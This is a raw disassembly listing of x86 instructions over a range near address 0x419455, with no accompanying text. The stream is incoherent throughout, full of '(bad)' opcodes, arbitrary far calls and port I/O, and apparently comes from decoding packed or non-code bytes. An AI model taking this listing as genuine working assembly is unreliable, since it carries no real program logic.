  419455:	lods   eax,DWORD PTR ds:[esi]
  419456:	cmp    eax,0xd956dbaa
  41945b:	mov    ds:0xd4ef924d,al
  419460:	dec    DWORD PTR [ecx+0x714a6cdd]
  419466:	cmp    esi,eax
  419468:	mov    edx,0xc9233aea
  41946d:	xor    al,0x97
  41946f:	stos   DWORD PTR es:[edi],eax
  419470:	(bad)  
  419471:	sti    
  419472:	pop    ebx
  419473:	push   cs
  419474:	mov    ecx,0x2670b653
  419479:	pop    esi
  41947a:	rcr    BYTE PTR [edi],cl
  41947c:	jb     0x419402
  41947e:	mov    ebx,0xffb44ada
  419483:	push   ds
  419484:	in     eax,0x4d
  419486:	arpl   WORD PTR [edx+0xc11f0b2],sp
  41948c:	jp     0x419473
  41948e:	sbb    ecx,DWORD PTR [ebp-0x7b9dbf3c]
  419494:	xchg   esi,eax
  419495:	xor    eax,0x8b4e59ab
  41949a:	cdq    
  41949b:	fld    DWORD PTR [eax+0x528dacb8]
  4194a1:	call   0xc189:0xbe7a89d1
  4194a8:	xchg   edi,eax
  4194a9:	add    DWORD PTR [eax],ebp
  4194ab:	into   
  4194ac:	mov    ds:0x64a030aa,eax
  4194b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4194b2:	sub    ecx,DWORD PTR [edi+0x6f]
  4194b5:	lods   al,BYTE PTR ds:[esi]
  4194b6:	and    DWORD PTR [edi+eax*4],edx
  4194b9:	mov    bx,0x6fbb
  4194bd:	and    BYTE PTR [ecx+0x502c6c89],cl
  4194c3:	ins    BYTE PTR es:[edi],dx
  4194c4:	cld    
  4194c5:	dec    ebp
  4194c6:	loope  0x41953c
  4194c8:	xor    BYTE PTR [eax],bh
  4194ca:	xchg   ebp,eax
  4194cb:	sub    ebx,edi
  4194cd:	sub    DWORD PTR ss:[ebx-0x1b65258d],ecx
  4194d4:	sbb    BYTE PTR [ebx],cl
  4194d6:	push   0x9f4135b7
  4194db:	or     eax,edx
  4194dd:	dec    edi
  4194de:	enter  0x3b83,0x2a
  4194e2:	add    ch,BYTE PTR [ebp+0x6c41a367]
  4194e8:	fisttp DWORD PTR ds:0x4dcd6300
  4194ee:	xor    DWORD PTR ds:0x46dc2b55,eax
  4194f4:	sbb    eax,esi
  4194f6:	or     eax,0x4bfdd18b
  4194fb:	adc    al,BYTE PTR [esi+0x56]
  4194fe:	or     BYTE PTR [ecx-0x7ef52ea2],0x41
  419505:	jb     0x41955a
  419507:	ins    DWORD PTR es:[edi],dx
  419508:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419509:	repnz mov esp,esi
  41950c:	retf   0xdca6
  41950f:	in     al,dx
  419510:	ja     0x41955c
  419512:	sahf   
  419513:	push   edi
  419514:	lock xor dl,bh
  419517:	xor    bh,al
  419519:	jb     0x4194f8
  41951b:	cmovo  edi,edi
  41951e:	mov    fs,WORD PTR [edx]
  419520:	jl     0x41955d
  419522:	cmp    DWORD PTR [edi],0xffffffa6
  419525:	xor    eax,0xcd684dfe
  41952a:	in     eax,0x89
  41952c:	fnstenv [edi]
  41952e:	push   eax
  41952f:	(bad)  
  419530:	das    
  419531:	outs   dx,DWORD PTR ds:[esi]
  419532:	sbb    ecx,ebp
  419534:	adc    bh,BYTE PTR [ebx]
  419536:	sti    
  419537:	mov    eax,ds:0xa80ac248
  41953c:	loopne 0x4195b9
  41953e:	int    0x17
  419540:	arpl   di,si
  419542:	sbb    eax,0xab878de
  419547:	xor    BYTE PTR [ebp-0x5a28e205],bl
  41954d:	test   BYTE PTR [ecx+0x17d3471],bh
  419553:	clc    
  419554:	mov    ch,0xf3
  419556:	lds    ecx,FWORD PTR [edi+0x8]
  419559:	adc    ch,BYTE PTR [edi]
  41955b:	fimul  DWORD PTR [ebx]
  41955d:	mov    ebp,0x8a1efc10
  419562:	fidiv  WORD PTR [esi]
  419564:	push   cs
  419565:	adc    bh,BYTE PTR [edx+0x50]
  419568:	push   ds
  419569:	dec    ebp
  41956a:	es jmp 0xa2d9:0x7b06ff86
  419572:	mov    al,0x71
  419574:	hlt    
  419575:	popw   es
  419577:	out    0xba,eax
  419579:	cmova  edx,DWORD PTR [edi-0x272175be]
  419580:	cmp    ebp,DWORD PTR [ebp-0x59]
  419583:	cs jge 0x419523
  419586:	xlat   BYTE PTR ds:[ebx]
  419587:	sbb    ah,BYTE PTR [eax+0x77]
  41958a:	sub    DWORD PTR [edi],ebp
  41958c:	add    BYTE PTR [esi+0x7793a71d],cl
  419592:	pop    ds
  419593:	push   0x37
  419595:	mov    dl,0x5d
  419597:	test   BYTE PTR [ebp-0x37],dh
  41959a:	pop    eax
  41959b:	add    al,0x77
  41959d:	pop    eax
  41959e:	popa   
  41959f:	icebp  
  4195a0:	pop    edi
  4195a1:	int3   
  4195a2:	pop    edx
  4195a3:	jbe    0x4195c8
  4195a5:	jp     0x4195cd
  4195a7:	outs   dx,BYTE PTR ds:[esi]
  4195a8:	in     al,dx
  4195a9:	imul   ch
  4195ab:	aaa    
  4195ac:	or     ecx,ebx
  4195ae:	idiv   DWORD PTR [ebx-0x545ad17c]
  4195b4:	mov    ds:0x7a1216f3,al
  4195b9:	call   0xaca7:0xbe99fec4
  4195c0:	xor    esp,DWORD PTR [edx]
  4195c2:	outs   dx,DWORD PTR ds:[esi]
  4195c3:	adc    al,0xe6
  4195c5:	inc    edi
  4195c6:	and    al,0xbb
  4195c8:	inc    ecx
  4195c9:	and    BYTE PTR [edi],0x85
  4195cc:	push   cs
  4195cd:	cmc    
  4195ce:	pop    ds
  4195cf:	call   0x6aa6:0xe2b7131b
  4195d6:	jb     0x419562
  4195d8:	mov    WORD PTR [edx+0x612ff6bc],cs
  4195de:	lahf   
  4195df:	sbb    eax,0xed21d979
  4195e4:	out    dx,al
  4195e5:	dec    ecx
  4195e6:	mov    ebx,?
  4195e8:	and    dl,ah
  4195ea:	out    0x23,eax
  4195ec:	sub    edi,DWORD PTR [ebp+0x7aa77506]
  4195f2:	xor    ah,BYTE PTR [esi-0x573c3413]
  4195f8:	mov    cl,BYTE PTR [ebx-0x80]
  4195fb:	stc    
  4195fc:	dec    eax
  4195fd:	cmp    al,0x95
  4195ff:	(bad)  
  419600:	jae    0x419657
  419602:	fisubr DWORD PTR ds:0x3a1169
  419608:	in     al,dx
  419609:	inc    esi
  41960a:	ds mov ch,0x35
  41960d:	sub    bl,dl
  41960f:	lds    edi,FWORD PTR [ebx]
  419611:	mov    bl,0x45
  419613:	arpl   WORD PTR [ecx],sp
  419615:	jno    0x4195d1
  419617:	sub    dh,BYTE PTR [eax+0x25]
  41961a:	ds mov ecx,0xcf09c02
  419620:	imul   di,ax,0xd660
  419625:	scas   al,BYTE PTR es:[edi]
  419626:	jne    0x41968e
  419628:	mov    al,ds:0xf595a161
  41962d:	pop    ecx
  41962e:	dec    ecx
  41962f:	int3   
  419630:	out    0x5e,eax
  419632:	cdq    
  419633:	and    eax,DWORD PTR ds:[ebx]
  419636:	push   cs
  419637:	frstor [ebp+0x6d]
  41963a:	cli    
  41963b:	pop    es
  41963c:	xor    eax,0x70e13e5a
  419641:	jno    0x8c1f2f44
  419647:	ins    BYTE PTR es:[edi],dx
  419648:	mov    esp,0xd1697a9b
  41964d:	mov    dl,0xa3
  41964f:	lods   al,BYTE PTR ds:[esi]
  419650:	(bad)  
  419651:	outs   dx,BYTE PTR ds:[esi]
  419652:	aam    0xa3
  419654:	(bad)  
  419655:	fsub   DWORD PTR [edx+0x5344f364]
  41965b:	or     eax,0x7e907b9e
  419660:	out    dx,al
  419661:	std    
  419662:	scas   eax,DWORD PTR es:[edi]
  419663:	pop    ebp
  419664:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419665:	push   0xd8a5314e
  41966a:	dec    edi
  41966b:	xchg   ecx,eax
  41966c:	and    bh,dh
  41966e:	imul   ecx,ebx,0xd0038521
  419674:	aam    0xe7
  419676:	inc    edx
  419677:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419678:	dec    BYTE PTR [ebp+0x66]
  41967b:	icebp  
  41967c:	and    eax,0x2be55535
  419681:	das    
  419682:	fldenv [ecx-0x3d76c5f5]
  419688:	and    al,0x32
  41968a:	pop    ss
  41968b:	and    al,0x71
  41968d:	xchg   esi,eax
  41968e:	add    BYTE PTR [ebx],ah
  419690:	jp     0x4196d6
  419692:	mov    edx,0x9449e619
  419697:	out    0x9e,eax
  419699:	jge    0x41970d
  41969b:	adc    al,0xe5
  41969d:	cli    
  41969e:	enter  0xe3a9,0xff
  4196a2:	cdq    
  4196a3:	jl     0x419695
  4196a5:	xchg   edi,eax
  4196a6:	out    0xdf,eax
  4196a8:	loope  0x4196b0
  4196aa:	mov    ds:0xef7d6ed2,al
  4196af:	dec    ebp
  4196b0:	call   0x65c470fe
  4196b5:	and    al,0x14
  4196b7:	mov    bh,0xe3
  4196b9:	cmp    eax,0xb827bfd7
  4196be:	mov    edi,0x53e4c81a
  4196c3:	add    eax,0xe91e86dc
  4196c8:	push   eax
  4196c9:	adc    eax,0x8a759407
  4196ce:	or     al,0x89
  4196d0:	retf   
  4196d1:	adc    DWORD PTR [edi-0x9f6c70c],eax
  4196d7:	xor    BYTE PTR [edi],0x95
  4196da:	push   0xe42700a
  4196df:	mov    ecx,DWORD PTR [ecx+0x5be91b6b]
  4196e5:	and    al,0xdd
  4196e7:	and    edi,DWORD PTR [esi+ebp*1+0x17]
  4196eb:	jb     0x419769
  4196ed:	pop    edi
  4196ee:	sub    ecx,DWORD PTR [ebx+0x6f016d3c]
  4196f4:	add    eax,0x4c27a02b
  4196f9:	xchg   DWORD PTR ds:0xc5a028c2,esp
  4196ff:	fwait
  419700:	xlat   BYTE PTR ds:[ebx]
  419701:	inc    eax
  419702:	imul   ebp,DWORD PTR [esi+0x4d],0x4e1bfc64
  419709:	cmp    BYTE PTR [edx+0x6f23e0d0],cl
  41970f:	jbe    0x4196d0
  419711:	jecxz  0x419696
  419713:	pop    eax
  419714:	popf   
  419715:	dec    edx
  419716:	ret    
  419717:	or     dh,BYTE PTR [edi+ebx*2]
  41971a:	cmp    ecx,DWORD PTR [ebx+0x1f988b55]
  419720:	out    dx,al
  419721:	push   ecx
  419722:	loopne 0x419753
  419724:	pushf  
  419725:	sar    DWORD PTR [ebp+0x2b],1
  419728:	je     0x419708
  41972a:	arpl   WORD PTR [edi+0x32],bx
  41972d:	imul   ebx,DWORD PTR [eax],0x459817a2
  419733:	and    al,0x34
  419735:	mov    cl,BYTE PTR [ebp-0x13c6b827]
  41973b:	test   DWORD PTR [esi+0x6766c8da],eax
  419741:	(bad)  
  419742:	cmp    dh,BYTE PTR [eax]
  419744:	cmp    BYTE PTR [ebp+0x3aa83259],ch
  41974a:	jb     0x4196e6
  41974c:	ret    0x8483
  41974f:	fistp  DWORD PTR [edi]
  419751:	mov    al,0x9f
  419753:	xor    BYTE PTR [ebp-0x1985f3dd],bh
  419759:	fwait
  41975a:	arpl   WORD PTR [ebp-0x6a],sp
  41975d:	std    
  41975e:	ins    DWORD PTR es:[edi],dx
  41975f:	xchg   edx,eax
  419760:	fisub  DWORD PTR [edx+0x1e6ffde1]
  419766:	mov    BYTE PTR [edx],ch
  419768:	mov    ecx,0xea928625
  41976d:	rol    BYTE PTR [edi],cl
  41976f:	sbb    eax,0xdbb91f08
  419774:	shl    BYTE PTR [edi+eax*1-0x271aa813],0xeb
  41977c:	sub    DWORD PTR [edx],esp
  41977e:	pop    ebx
  41977f:	mov    bh,0xc9
  419781:	adc    al,0x66
  419783:	dec    al
  419785:	push   eax
  419786:	push   cs
  419787:	outs   dx,DWORD PTR ds:[esi]
  419788:	adc    BYTE PTR [edx],dl
  41978a:	fwait
  41978b:	sub    bh,bl
  41978d:	adc    eax,0x25497cce
  419792:	sbb    DWORD PTR [eax-0x68],ebx
  419795:	cmc    
  419796:	iret   
  419797:	xchg   edx,eax
  419798:	dec    esp
  419799:	inc    ebx
  41979a:	sbb    bh,ch
  41979c:	cdq    
  41979d:	arpl   WORD PTR [ecx+0x1f144a05],bp
  4197a3:	dec    esi
  4197a4:	gs inc ebp
  4197a6:	lods   al,BYTE PTR ds:[esi]
  4197a7:	xchg   edi,eax
  4197a8:	xchg   edx,eax
  4197a9:	sub    DWORD PTR [esi-0x49],0x2
  4197ad:	(bad)  
  4197ae:	cmp    al,BYTE PTR [eax]
  4197b0:	retf   0x8a9d
  4197b3:	or     ah,BYTE PTR [ebp-0x2f]
  4197b6:	(bad)  
  4197b7:	mul    DWORD PTR [ebx]
  4197b9:	inc    edx
  4197ba:	retf   0x481b
  4197bd:	lahf   
  4197be:	dec    ecx
  4197bf:	fimul  DWORD PTR [ebx+0x78]
  4197c2:	xlat   BYTE PTR ds:[ebx]
  4197c3:	cmp    al,0x7b
  4197c5:	xlat   BYTE PTR ds:[ebx]
  4197c6:	jno    0x4197b8
  4197c8:	dec    ebx
  4197c9:	ins    BYTE PTR es:[edi],dx
  4197ca:	scas   eax,DWORD PTR es:[edi]
  4197cb:	enter  0xc346,0x86
  4197cf:	xchg   BYTE PTR [ecx],ch
  4197d1:	xlat   BYTE PTR ds:[ebx]
  4197d2:	xchg   ebp,eax
  4197d3:	data16 xor al,0x36
  4197d6:	retf   
  4197d7:	cld    
  4197d8:	sbb    eax,0x255b0c00
  4197dd:	mov    WORD PTR [ebp+0xa],ss
  4197e0:	push   cs
  4197e1:	xor    al,ah
  4197e3:	dec    eax
  4197e4:	test   ebx,ecx
  4197e6:	sbb    al,0xf7
  4197e8:	or     ebx,ecx
  4197ea:	push   0x2a
  4197ec:	aaa    
  4197ed:	push   0xffffffe5
  4197ef:	dec    ecx
  4197f0:	in     al,0xeb
  4197f2:	mov    eax,ds:0x55b3a8f7
  4197f7:	sub    edx,eax
  4197f9:	in     eax,dx
  4197fa:	btc    DWORD PTR [ecx-0x41c43a20],eax
  419801:	jg     0x41981f
  419803:	int    0x22
  419805:	lea    ebp,[ebp+0x15]
  419808:	xchg   edi,eax
  419809:	retf   
  41980a:	cld    
  41980b:	ror    DWORD PTR [ebp-0x1],1
  41980e:	popf   
  41980f:	outs   dx,DWORD PTR ds:[esi]
  419810:	cmp    eax,0x7f2e8473
  419815:	adc    DWORD PTR [edi+0x14],ebx
  419818:	retf   
  419819:	pusha  
  41981a:	mov    edi,0x40bb4636
  41981f:	gs push ecx
  419821:	pop    ds
  419822:	mov    esi,DWORD PTR [ebx]
  419824:	push   edi
  419825:	xor    al,0xb3
  419827:	jge    0x419833
  419829:	push   0xffffffe1
  41982b:	sub    DWORD PTR [esi+0xa33b989],ecx
  419831:	repz pop edx
  419833:	inc    esp
  419834:	add    eax,DWORD PTR [ebx+ebp*8-0x5d5e4126]
  41983b:	and    eax,0xcc96f0c0
  419840:	stc    
  419841:	sub    BYTE PTR [eax+0x7c7ebb0],dl
  419847:	ins    BYTE PTR es:[edi],dx
  419848:	mov    eax,0xcab28ac8
  41984d:	sti    
  41984e:	mov    WORD PTR [ecx-0x70],?
  419851:	sub    dl,BYTE PTR [ebx+0x4b]
  419854:	sub    BYTE PTR [ebx-0x28],cl
  419857:	aad    0x85
  419859:	mov    dl,0xa2
  41985b:	test   DWORD PTR [ecx+0x4f],ebx
  41985e:	stos   BYTE PTR es:[edi],al
  41985f:	push   esp
  419860:	push   0x593377ad
  419865:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  419867:	jmp    0xe093:0x210cb56f
  41986e:	push   0xffffffb8
  419870:	xchg   ebp,eax
  419871:	sub    eax,DWORD PTR [edx-0x3798c734]
  419877:	ret    0x54d9
  41987a:	dec    ebx
  41987b:	out    dx,al
  41987c:	or     BYTE PTR [eax-0x516e7f3a],ah
  419882:	mov    WORD PTR [ebx],es
  419884:	xchg   edx,eax
  419885:	lock dec ebp
  419887:	push   ebp
  419888:	inc    edi
  419889:	dec    edi
  41988a:	cmp    eax,0x5ce11d0a
  41988f:	pop    esp
  419890:	mov    eax,0xf3d8cf1c
  419895:	cwde   
  419896:	xchg   ebx,eax
  419897:	(bad)  
  419898:	ficomp WORD PTR [ebp+0x4f6bd178]
  41989e:	jg     0x419832
  4198a0:	dec    ecx
  4198a1:	adc    ah,BYTE PTR [edi]
  4198a3:	mov    ebx,0xca24f255
  4198a8:	sub    al,0x99
  4198aa:	push   esi
  4198ab:	adc    ecx,edx
  4198ad:	pop    eax
  4198ae:	fidiv  DWORD PTR [ebx+ebx*4]
  4198b1:	leave  
  4198b2:	cmc    
  4198b3:	xchg   ecx,eax
  4198b4:	mov    eax,?
  4198b6:	push   edi
  4198b7:	dec    ebx
  4198b8:	mov    bh,0xf3
  4198ba:	sbb    BYTE PTR [ebx+0x3],bh
  4198bd:	out    0x20,eax
  4198bf:	pop    eax
  4198c0:	stc    
  4198c1:	jns    0x419900
  4198c3:	xchg   esp,eax
  4198c4:	and    eax,0xb8c8b1f1
  4198c9:	call   FWORD PTR [edx-0x25]
  4198cc:	je     0x419883
  4198ce:	lahf   
  4198cf:	fisub  WORD PTR ds:0x18732f83
  4198d5:	jmp    0x7ca8:0xd73c65b5
  4198dc:	xchg   esp,eax
  4198dd:	call   0x208a991
  4198e2:	jb     0x419900
  4198e4:	aaa    
  4198e5:	cwde   
  4198e6:	js     0x41987c
  4198e8:	pop    ecx
  4198e9:	or     bl,BYTE PTR [edx+ebx*4]
  4198ec:	aam    0x4f
  4198ee:	fld    DWORD PTR [ecx]
  4198f0:	adc    DWORD PTR [eax+0x51],esp
  4198f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198f4:	mov    ah,0x28
  4198f6:	mov    esi,0x2bb78331
  4198fb:	inc    esi
  4198fc:	jo     0x4198d3
  4198fe:	fwait
  4198ff:	sti    
  419900:	out    dx,al
  419901:	push   0xfffffffd
  419903:	imul   eax,DWORD PTR [ecx+0x240ed8ea],0x85a10be2
  41990d:	and    BYTE PTR [edi-0x2f],ch
  419910:	xchg   edx,eax
  419911:	inc    ecx
  419912:	stos   BYTE PTR es:[edi],al
  419913:	and    eax,0xc611c92d
  419918:	(bad)  
  419919:	loopne 0x41998f
  41991b:	daa    
  41991c:	jne    0x419947
  41991e:	adc    ch,bh
  419920:	adc    ch,BYTE PTR [ebp+eax*4-0x55672709]
  419927:	je     0x419904
  419929:	xor    cl,bh
  41992b:	nop
  41992c:	loope  0x419926
  41992e:	pop    ebx
  41992f:	popa   
  419930:	cwde   
  419931:	push   ecx
  419932:	mov    edx,0x1d164b61
  419937:	imul   edi,DWORD PTR [edx],0xffffff99
  41993a:	nop
  41993b:	scas   eax,DWORD PTR es:[edi]
  41993c:	es or  bl,ah
  41993f:	sti    
  419940:	jp     0x4199ac
  419942:	je     0x419964
  419944:	dec    eax
  419945:	leave  
  419946:	outs   dx,DWORD PTR ds:[esi]
  419947:	pushf  
  419948:	ds mov cl,0xa7
  41994b:	push   ebp
  41994c:	pop    ecx
  41994d:	mov    esp,0x99d84f5
  419952:	retf   
  419953:	fcmovne st,st(3)
  419956:	jmp    0x39a5:0x6ba1e2a8
  41995d:	inc    esi
  41995e:	adc    eax,ebp
  419960:	add    al,0x0
  419962:	not    edi
  419964:	das    
  419965:	outs   dx,BYTE PTR ds:[esi]
  419966:	add    DWORD PTR [ebx+0x2079803f],0xaec7fca5
  419970:	jg     0x419924
  419972:	or     ebp,DWORD PTR [esi-0x64cda081]
  419978:	stc    
  419979:	(bad)
  41997d:	xlat   BYTE PTR ds:[ebx]
  41997e:	outs   dx,DWORD PTR ds:[esi]
  41997f:	ds popf 
  419981:	retf   0xb355
  419984:	jmp    0x1666:0xfef53867
  41998b:	loop   0x419955
  41998d:	ins    DWORD PTR es:[edi],dx
  41998e:	in     al,0x38
  419990:	jmp    0xef5a:0xdaa3ffed
  419997:	por    mm0,mm3
  41999a:	jmp    0xc36a:0xee43fbbe
  4199a1:	loope  0x419930
  4199a3:	jns    0x419999
  4199a5:	mov    DWORD PTR [ebx],edx
  4199a7:	es fwait
  4199a9:	not    BYTE PTR [ebx-0x1e6489e8]
  4199af:	jne    0x419976
  4199b1:	and    bh,BYTE PTR [edi]
  4199b3:	dec    esp
  4199b4:	fs mov ch,0x94
  4199b7:	ror    BYTE PTR [si-0x2b],1
  4199bb:	std    
  4199bc:	fwait
  4199bd:	jmp    0x41994c
  4199bf:	push   edi
  4199c0:	jmp    0x1787:0x30ef08c9
  4199c7:	mov    ebp,0x8bb77ef9
  4199cc:	mov    edx,DWORD PTR [edi-0x67]
  4199cf:	inc    ecx
  4199d0:	lahf   
  4199d1:	aas    
  4199d2:	cli    
  4199d3:	and    eax,0xb93be381
  4199d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199d9:	push   edi
  4199da:	test   al,0xdf
  4199dc:	int3   
  4199dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4199de:	sar    BYTE PTR [edx+ecx*4+0x31f7f5ce],cl
  4199e5:	sti    
  4199e6:	inc    esp
  4199e7:	push   ebx
  4199e8:	aad    0xd0
  4199ea:	xor    edi,DWORD PTR [ebx-0xd76b56f]
  4199f0:	pop    ds
  4199f1:	repnz ins BYTE PTR es:[edi],dx
  4199f3:	std    
  4199f4:	pop    ecx
  4199f5:	jecxz  0x419a51
  4199f7:	retf   
  4199f8:	dec    esi
  4199f9:	in     eax,dx
  4199fa:	cmp    BYTE PTR ds:0xd1499505,al
  419a00:	cli    
  419a01:	jle    0x419a16
  419a03:	in     eax,dx
  419a04:	cmc    
  419a05:	ret    
  419a06:	leave  
  419a07:	mov    ds:0x4c8cc0b2,eax
  419a0c:	pop    ss
  419a0d:	cwde   
  419a0e:	ins    DWORD PTR es:[di],dx
  419a10:	mov    al,0x68
  419a12:	pop    ecx
  419a13:	xchg   ebp,eax
  419a14:	out    0xc2,eax
  419a16:	mov    WORD PTR [edx+0xd],?
  419a19:	nop
  419a1a:	pop    ebx
  419a1b:	sub    al,0x92
  419a1d:	mov    ebp,0xf8bd7194
  419a22:	je     0x419a42
  419a24:	mov    al,0x49
  419a26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a27:	add    DWORD PTR [esi+0x28],esi
  419a2a:	pop    ecx
  419a2b:	pushf  
  419a2c:	xor    esp,DWORD PTR [ecx-0x57baf867]
  419a32:	xchg   esp,eax
  419a33:	ret    
  419a34:	jl     0x419a00
  419a36:	mov    esi,0x9d51df54
  419a3b:	(bad)  
  419a3c:	xlat   BYTE PTR ds:[ebx]
  419a3d:	and    eax,0x74f869b1
  419a42:	mov    edi,0xb0f0af1d
  419a47:	stc    
  419a48:	jbe    0x419a97
  419a4a:	push   es
  419a4b:	push   0xe9e5332b
  419a50:	inc    esi
  419a51:	(bad)  
  419a53:	lahf   
  419a54:	jnp    0x419a5e
  419a56:	push   cs
  419a57:	xchg   esi,eax
  419a58:	xchg   esi,eax
  419a59:	jo     0x4199f2
  419a5b:	dec    dh
  419a5d:	data16 or BYTE PTR [ebx+0x38],al
  419a61:	mov    eax,ds:0x3a9c5220
  419a66:	sbb    eax,0x780c1664
  419a6b:	cmp    eax,0x25f4a450
  419a70:	sbb    ah,bl
  419a72:	sbb    eax,0xc6189e10
  419a77:	pcmpgtd mm3,mm4
  419a7a:	lock xor esi,DWORD PTR [ecx]
  419a7d:	xor    dl,BYTE PTR gs:[ecx]
  419a80:	fistp  WORD PTR [ebp-0x7ec3b732]
  419a86:	push   ecx
  419a87:	outs   dx,BYTE PTR ds:[esi]
  419a88:	cld    
  419a89:	bound  edi,QWORD PTR [ecx+0x61]
  419a8c:	fcmove st,st(3)
  419a8e:	out    dx,eax
  419a8f:	sub    ebx,DWORD PTR [edi-0x6b]
  419a92:	loope  0x419aea
  419a94:	jmp    0x419a54
  419a96:	stc    
  419a97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419a98:	call   0x36cb5aa3
  419a9d:	pop    edx
  419a9e:	mov    bh,0x89
  419aa0:	das    
  419aa1:	je     0x419ab7
  419aa3:	jnp    0x419a60
  419aa5:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  419aa7:	call   0x54cf:0xf89e8811
  419aae:	call   0x203:0x9df9d997
  419ab5:	pop    ecx
  419ab6:	int    0xd5
  419ab8:	cmc    
  419ab9:	pop    ebp
  419aba:	mov    eax,0xbc666f94
  419abf:	and    cl,cl
  419ac1:	sub    DWORD PTR [edi-0x6969180f],0x49ad4a5e
  419acb:	pop    ebx
  419acc:	mov    cl,0x5c
  419ace:	mov    eax,ds:0x629e152c
  419ad3:	aaa    
  419ad4:	jae    0x419af3
  419ad6:	pop    ds
  419ad7:	and    al,0x8d
  419ad9:	cmp    BYTE PTR [ebp-0x71],bl
  419adc:	pop    es
  419add:	jmp    0x419adf
  419adf:	push   ebp
  419ae0:	(bad)  
  419ae1:	in     al,0x46
  419ae3:	dec    edx
  419ae4:	stos   DWORD PTR es:[edi],eax
  419ae5:	jmp    0x419a79
  419ae7:	int    0x1
  419ae9:	in     eax,dx
  419aea:	mov    dh,0xb7
  419aec:	int3   
  419aed:	cmc    
  419aee:	mul    DWORD PTR [ebx-0x1d67f420]
  419af4:	test   al,0xc7
  419af6:	lods   eax,DWORD PTR ds:[esi]
  419af7:	mov    bl,0x8b
  419af9:	and    ebx,DWORD PTR [esi-0x7c]
  419afc:	pop    esi
  419afd:	ffreep st(7)
  419aff:	xchg   ebp,eax
  419b00:	imul   ecx,edx,0x2c9a8115
  419b06:	jmp    FWORD PTR [edx-0x694eada]
  419b0c:	xor    edi,ebx
  419b0e:	icebp  
  419b0f:	push   ss
  419b10:	ins    BYTE PTR es:[edi],dx
  419b11:	daa    
  419b12:	js     0x419b93
  419b14:	enter  0xa635,0x28
  419b18:	rcr    BYTE PTR [ecx],0xe2
  419b1b:	cmp    BYTE PTR [eax-0x5d7412df],al
  419b21:	and    BYTE PTR [ebp+ecx*1+0x58bcf2ef],0x43
  419b29:	xchg   ebp,eax
  419b2a:	aam    0xb0
  419b2c:	push   ds
  419b2d:	out    0x1b,eax
  419b2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419b30:	repz jle 0x419b6f
  419b33:	mov    ebx,DWORD PTR ds:0x671c4e55
  419b39:	sub    eax,0xe8b50998
  419b3e:	gs dec ebx
  419b40:	test   BYTE PTR [esi],0xce
  419b43:	sahf   
  419b44:	cmp    al,0x8f
  419b46:	inc    esp
  419b47:	div    BYTE PTR ds:0x5443386e
  419b4d:	scas   eax,DWORD PTR es:[edi]
  419b4e:	pop    ds
  419b4f:	pop    ecx
  419b50:	sti    
  419b51:	push   0x50865430
  419b56:	test   DWORD PTR [esi-0x66],esi
  419b59:	mov    ch,BYTE PTR [eax-0x662c35fe]
  419b5f:	sub    ch,BYTE PTR [ebp+0x6d8a9f37]
  419b65:	mov    cl,0xa3
  419b67:	xchg   edi,eax
  419b68:	iret   
  419b69:	inc    ebx
  419b6a:	pop    eax
  419b6b:	mov    eax,0x647ceb7e
  419b70:	mov    ah,0xa3
  419b72:	mov    eax,0x22a03a7a
  419b77:	out    0xfe,eax
  419b79:	repnz rcl BYTE PTR [edi+eiz*4+0x755c7e67],0xb2
  419b82:	outs   dx,DWORD PTR ds:[esi]
  419b83:	jbe    0x419bfb
  419b85:	push   edx
  419b86:	sub    edi,DWORD PTR [ecx-0x6]
  419b89:	imul   eax,DWORD PTR [ecx+0x462fcec1],0x51d5a1cb
  419b93:	call   0x41f4:0xeb349490
  419b9a:	in     eax,dx
  419b9b:	inc    ebp
  419b9c:	mov    eax,0xfa333158
  419ba1:	loope  0x419bbd
  419ba3:	xchg   ebp,eax
  419ba4:	cs pop edx
  419ba6:	push   cs
  419ba7:	sti    
  419ba8:	mov    esp,DWORD PTR [ecx]
  419baa:	mov    ah,0x6a
  419bac:	and    ch,BYTE PTR [eax]
  419bae:	pop    ebp
  419baf:	out    0x4d,al
  419bb1:	data16 mov dl,BYTE PTR [ebp-0x50]
  419bb5:	mov    ecx,0x13fd3f7e
  419bba:	mov    al,0xb1
  419bbc:	(bad)  
  419bbd:	shl    BYTE PTR [eax-0x4b],1
  419bc0:	inc    esi
  419bc1:	leave  
  419bc2:	scas   al,BYTE PTR es:[edi]
  419bc3:	sub    al,0xa2
  419bc5:	mul    BYTE PTR [ebx]
  419bc7:	es imul ebx,ecx,0x476eba02
  419bce:	xchg   ebx,eax
  419bcf:	jns    0x419c20
  419bd1:	clc    
  419bd2:	sub    bl,BYTE PTR [edi+0x48206297]
  419bd8:	sbb    eax,0x52d089f5
  419bdd:	repz jecxz 0x419c53
  419be0:	pushf  
  419be1:	jge    0x419b70
  419be3:	ret    0xe060
  419be6:	sbb    DWORD PTR [esi+0x55],edx
  419be9:	icebp  
  419bea:	jl     0x419c07
  419bec:	les    edi,FWORD PTR [edi+esi*4+0x7f]
  419bf0:	out    0x48,al
  419bf2:	fcmovb st,st(2)
  419bf4:	cdq    
  419bf5:	lods   eax,DWORD PTR ds:[esi]
  419bf6:	(bad)  [ecx]
  419bf8:	xchg   esi,eax
  419bf9:	popa   
  419bfa:	into   
  419bfb:	jae    0x419c7a
  419bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419bfe:	aaa    
  419bff:	aas    
  419c00:	xor    BYTE PTR [ecx+0x46e43cd3],dl
  419c06:	inc    ecx
  419c07:	popf   
  419c08:	adc    al,0x83
  419c0a:	push   esi
  419c0b:	cdq    
  419c0c:	pop    ds
  419c0d:	pop    ebx
  419c0e:	int3   
  419c0f:	pop    es
  419c10:	xor    al,0xc4
  419c12:	pop    eax
  419c13:	idiv   cl
  419c15:	pop    ecx
  419c16:	cmp    eax,0x152e32d8
  419c1b:	fsubr  DWORD PTR ds:0x311ee437
  419c21:	js     0x419bd1
